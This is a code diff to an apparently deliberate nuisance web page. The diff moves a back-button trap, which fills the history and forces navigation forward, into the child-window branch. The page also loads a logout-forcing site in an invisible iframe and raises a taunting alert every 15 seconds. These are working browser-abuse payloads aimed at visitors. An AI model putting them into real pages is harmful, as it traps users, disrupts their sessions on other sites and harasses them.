@@ -5,7 +5,7 @@
 <body>
 
 <style>
-  html, body { width: 100%; margin: 0; }
+  html, body { width: 100%; height: 100%; margin: 0; }
   video { width: 100%; height: 100%; }
   iframe { width: 1px; height: 1px; } /* Make iframes invisible */
   #pip-video { opacity: 0 }
@@ -84,14 +84,6 @@
     }
   }
 
-  for (let i = 1; i < 20; i++) {
-    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
-  }
-  window.history.pushState({}, '', window.location.pathname)
-  window.addEventListener('popstate', () => {
-    window.history.forward()
-  })
-
   if (window.opener) {
     // *** RUNS IN CHILD WINDOW: ***
 
@@ -137,6 +129,14 @@
     const logoutIframe = document.createElement('iframe')
     logoutIframe.src = 'http://superlogout.com'
     document.body.appendChild(logoutIframe)
+
+    for (let i = 1; i < 20; i++) {
+      window.history.pushState({}, '', window.location.pathname + '?q=' + i)
+    }
+    window.history.pushState({}, '', window.location.pathname)
+    window.addEventListener('popstate', () => {
+      window.history.forward()
+    })
 
     setInterval(() => window.alert(Array(100).join('ARE YOU ANNOYED YET? ')), 15000)
   }
